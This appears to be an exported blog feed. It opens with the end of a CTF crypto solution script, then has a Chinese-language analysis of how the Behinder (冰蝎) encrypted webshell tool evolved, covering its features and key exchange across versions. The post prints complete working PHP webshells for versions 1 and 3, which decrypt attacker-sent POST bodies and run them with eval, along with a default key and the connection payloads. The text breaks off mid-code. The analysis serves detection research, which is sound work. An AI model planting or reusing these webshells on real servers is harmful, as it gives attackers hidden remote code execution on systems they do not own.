class="number">64663</span>, <span class="number">64667</span>, <span class="number">64679</span>, <span class="number">64693</span>, <span class="number">64709</span>, <span class="number">64717</span>, <span class="number">64747</span>, <span class="number">64763</span>,</span><br><span class="line">          <span class="number">64781</span>, <span class="number">64783</span>, <span class="number">64793</span>, <span class="number">64811</span>, <span class="number">64817</span>, <span class="number">64849</span>, <span class="number">64853</span>, <span class="number">64871</span>, <span class="number">64877</span>, <span class="number">64879</span>, <span class="number">64891</span>, <span class="number">64901</span>, <span class="number">64919</span>, <span class="number">64921</span>, <span class="number">64927</span>,</span><br><span class="line">          <span class="number">64937</span>, <span class="number">64951</span>, <span class="number">64969</span>, <span class="number">64997</span>, <span class="number">65003</span>, <span class="number">65011</span>, <span class="number">65027</span>, <span class="number">65029</span>, <span class="number">65033</span>, <span class="number">65053</span>, <span class="number">65063</span>, <span class="number">65071</span>, <span class="number">65089</span>, <span class="number">65099</span>, <span class="number">65101</span>,</span><br><span class="line">          <span class="number">65111</span>, <span class="number">65119</span>, <span class="number">65123</span>, <span class="number">65129</span>, <span class="number">65141</span>, <span class="number">65147</span>, <span class="number">65167</span>, <span class="number">65171</span>, <span class="number">65173</span>, <span class="number">65179</span>, <span class="number">65183</span>, <span class="number">65203</span>, <span class="number">65213</span>, <span class="number">65239</span>, <span class="number">65257</span>,</span><br><span class="line">          <span class="number">65267</span>, <span class="number">65269</span>, <span class="number">65287</span>, <span class="number">65293</span>, <span class="number">65309</span>, <span class="number">65323</span>, <span class="number">65327</span>, <span class="number">65353</span>, <span class="number">65357</span>, <span class="number">65371</span>, <span class="number">65381</span>, <span class="number">65393</span>, <span class="number">65407</span>, <span class="number">65413</span>, <span class="number">65419</span>,</span><br><span class="line">          <span class="number">65423</span>, <span class="number">65437</span>, <span class="number">65447</span>, <span class="number">65449</span>, <span class="number">65479</span>, <span class="number">65497</span>, <span class="number">65519</span>, <span class="number">65521</span>]</span><br><span class="line"><span class="comment"># p = 59441</span></span><br><span class="line"><span class="comment"># primes=[59441]</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    k_box = []</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        line = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line">        line[<span class="number">4</span>] = grass[i]</span><br><span class="line">        k_box.append(line)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">        k_box[i + <span class="number">1</span>][<span class="number">3</span>] = (findFactor(k_box[i + <span class="number">1</span>][<span class="number">4</span>], k_box[i][<span class="number">4</span>], p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        k_box[i + <span class="number">2</span>][<span class="number">2</span>] = (findFactor(k_box[i + <span class="number">2</span>][<span class="number">3</span>], k_box[i + <span class="number">1</span>][<span class="number">3</span>], p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">        k_box[i + <span class="number">3</span>][<span class="number">1</span>] = (findFactor(k_box[i + <span class="number">3</span>][<span class="number">2</span>], k_box[i + <span class="number">2</span>][<span class="number">2</span>], p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        k_box[i + <span class="number">4</span>][<span class="number">0</span>] = (findFactor(k_box[i + <span class="number">4</span>][<span class="number">1</span>], k_box[i + <span class="number">3</span>][<span class="number">1</span>], p))</span><br><span class="line">    <span class="comment"># for line in k_box:</span></span><br><span class="line">    <span class="comment">#     print(line)</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">41</span>):</span><br><span class="line">        res.append(<span class="built_in">int</span>(findFactor(k_box[i + <span class="number">1</span>][<span class="number">0</span>], k_box[i][<span class="number">0</span>], p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(res) &lt; <span class="number">255</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>(res))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后解出来<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fsk_TPt_bmxNh3MWphM-kHdqhz7G.png" alt="" />然后再拼上 flag{，最后为<code>flag&#123;749d39d4-78db-4c55-b4ff-bca873d0f18e&#125;</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>冰蝎演化史——以php马为例</title>
      <link href="/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/"/>
      <url>/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p>冰蝎，著名的加密流量 webshell 管理工具，刚好前几天冰蝎出 4.0 版啦，谨以此文简单回顾一下这些年冰蝎功能进化与密钥交换方面的变化。功能是一个工具非常重要的部分，密钥交换体现了冰蝎马连接方式上的变化，小聊一下这两个个人认为比较重要的方面。本文主要关注 PHP 马，PHP 马传输的 payload 解开直接就是明文源码，比 JSP、ASP 好分析一些。因为 PHP 并不存在手动编译的过程，只要提供 PHP 源代码，然后 PHP 会自己把源代码编译为 opcode，由 Zend 引擎来解析 opcode。而冰蝎对于 java <a href="http://xn--0tr.NET">和.NET</a> 的支持都是传输加密之后的二进制字节流，java 环境传输 class 二进制文件，.NET 环境传输 dll 文件的二进制字节流，想要看到 payload 源码，还需反编译过程，稍微复杂一些。</p> <span id="more"></span><h1 id="功能改进"><a class="markdownIt-Anchor" href="#功能改进"></a> 功能改进</h1><p>作为工具的使用者，最关注的还是冰蝎功能的提升。而一个基本的 webshell 管理工具，以经典的菜刀为例，需要具有获取基本信息、命令执行、文件管理等基础功能，还有数据库管理、执行脚本等拓展功能。而脍炙人口的冰蝎当然不会止步于此，从冰蝎 1 开始，作者根据其丰富经验，就内置了九大功能：获取基本信息、文件管理、命令执行、虚拟终端、Socks 代理、反弹 Shell、数据库可视化管理、自定义代码执行和备忘录功能。其中除了 webshell 管理工具的常规功能外，针对内网环境，冰蝎 1 就可以做到自动上传并加载数据库驱动、反弹 Meterpreter、基于一句话木马的 Socks 代理功能等强大功能。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fo5xa_1EkDEvf5BkqF_XyIzXmJTp.png" alt="" />从反编译的源码来看，冰蝎 2 时作者已有内置插件的想法，但还没完善。除此之外，冰蝎从 2.0 版本开始还有一些细节方面的改善，开始支持自定义请求头、自定义 cookie、http 代理，虚拟终端 shell 进程可关闭等，从渗透角度绝对是更隐蔽了。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu_dvr9ywJ3NuZ2w7-D1OCZ_KxOB.png" alt="" />不久后推出的冰蝎 3 就拥有了插件扩展，ui 里可以看到支持在线安装，请求了一下发现返回是 null，可能当时不同功能的插件还有待开发吧。冰蝎 3 能够在 github 上找到的 release 都是 beta 版，界面中所提到 v3 正式版上线的“平行空间”功能都没有实现。不过冰蝎 3 多了 socks 代理连接、增强了内网穿透功能、在原有的基于 HTTP 的 socks5 隧道基础上，增加了单端口转发功能，可一键将内网端口映射至 VPS 或者本机端口、请求体增加了随机冗余参数、提升了客户端运行环境的兼容性、增加内存马防检测功能、Java 内存马注入功能、增加 CobaltStrike 一键上线、增强 shell 管理等等。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiLXrLR9sTIfGp1cHK-CY6Zw6uh_.png" alt="" />冰蝎 4 实现了“平行空间”功能，也就是内网资产探测和管理，本地环境简单尝试了一下，发现这个功能提升空间还是很大的。其他细节方面，冰蝎 4 增强了文件管理、连接逻辑重构、新增 Agent 内存马一键注入、多层网络子 Shell 穿透模块、自动缓存数据等功能。最重要的是，开放插件开发模块，可由使用者自己开发自定义插件，内置了多款插件，冰蝎生命力更进一步。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtmAHvEaf6cABdMUsSnAXfXITZS-.png" alt="" /></p><h1 id="密钥交换"><a class="markdownIt-Anchor" href="#密钥交换"></a> 密钥交换</h1><h2 id="冰蝎-1-一次-get协商密钥"><a class="markdownIt-Anchor" href="#冰蝎-1-一次-get协商密钥"></a> 冰蝎 1 一次 GET，协商密钥</h2><p>首先分析一下冰蝎 PHP 马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$key</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">rand</span>())),<span class="number">16</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$key</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">@<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>冰蝎 1 新增 shell 需要参数密码：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft4bnVJJtxQ6kErCKsLeFTbAQMCR.png" alt="" />这里的密码并非会话密钥，只是 GET 请求 URL 的参数。如果收到的是 GET 请求，则生成随机 16 位密钥，并将密钥写入 session，返回密钥明文。如果收到的是 POST 请求，就从 session 中取出密钥，函数 file_get_contents(&quot;PHP://input&quot;)获取 POST 请求体的内容，对其进行 base64 解码之后，在进行 AES 解密，执行解密结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">assert|<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSJlODAzYTkzYi02N2VhLTQ3ZWQtYjBiMC03NWQxNGNmOTBiZDkiOw0KbWFpbigkY29udGVudCk7&#x27;</span>));</span><br><span class="line">base64解码后：</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;e803a93b-67ea-47ed-b0b0-75d14cf90bd9&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>冰蝎 1 会以一次 GET 请求开始本次连接，本次 GET 请求的响应包 body 就是本次会话的 AES 使用的密钥，本次会话使用 AES/CBC/PKCS5Padding 加密，iv 是十六字节的 0x00 。GET 请求之后的第一个 POST 一般为请求基本信息，PHP 马就是请求 PHPinfo。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fou8RV5u8IC0kyYkuvtQtUo6FHzI.png" alt="" /></p><h2 id="冰蝎-2-多次-get可变载荷"><a class="markdownIt-Anchor" href="#冰蝎-2-多次-get可变载荷"></a> 冰蝎 2 多次 GET，可变载荷</h2><p>冰蝎 2webshell 相较于冰蝎 1 并没有太多改变，但在建立连接方面，冰蝎 2 会以至少两次 GET 请求开启一次与 webshell 的连接。通过比较前后两次请求包 body 的内容确定前后附加的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">11111payload22222</span><br><span class="line">11111another payload22222</span><br></pre></td></tr></table></figure><p>本次连接的会话密钥以最后一个 GET 请求的相应包 body 为准。两次 GET 显然提升了冰蝎马的灵活性。建立连接时 GET 请求之后，还有一次 POST 请求，用于验证密钥，以下是该 POST 请求携带 payload 所执行的函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;f61e7813-2848-4fe0-b658-d24f5c019f03&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>可以看到这里协商密钥的依据是 content，找源码发现是随机生成的 uuid，长度固定，或许可以作为一种检测特征。如果服务端能够正确解码 content，这证明双方持有的密钥一致，可以开始通信了。</p><h2 id="冰蝎-3-预共享密钥无明文交互"><a class="markdownIt-Anchor" href="#冰蝎-3-预共享密钥无明文交互"></a> 冰蝎 3 预共享密钥，无明文交互</h2><p>首先，什么叫做预共享密钥？所谓预共享，即在未连接时已完成密钥共享，冰蝎 3 新增 shell 设置有参数密码。默认密钥是作者的 id 的 MD5 值，而 aes 密钥一般为 128bit，16 字节，于是取 key 值的 MD5 前十六位作为密钥。开始连接时，客户端会发起一个 POST 请求，发送使用 key 的 MD5 前十六位加密密文的 base64 编码，若服务端能够正确解码，那么证明本次密钥协商成功。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu0ltOdco3qU_W_RccPBhJ_T_bzR.png" alt="" />以下是冰蝎 3 的默认 PHP 木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其基本功能就是解密 payload，执行其携带的函数，做了一定的免杀处理。本段更关注其加解密部分，参数 key 就是新建 shell 时参数密码值 MD5 的前 16 位，刚好 128bit。这个值当然也可以修改，改成别的字符串，PHP 马的参数 key 也需要更改成该字符串的 MD5 值前 16 位。协商密钥的 GET 请求包是冰蝎 1、2 的重要特征，冰蝎 3 采用预共享密钥，规避了密钥的明文传输，使流量更加隐蔽，在当时是对各家 waf 的一个全新考验。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft6mzNQcwOvTAdNHg6lH8vPEQdQz.png" alt="" />建立连接的 POST 请求包的 Payload 功能是让服务端执行以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line"><span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span 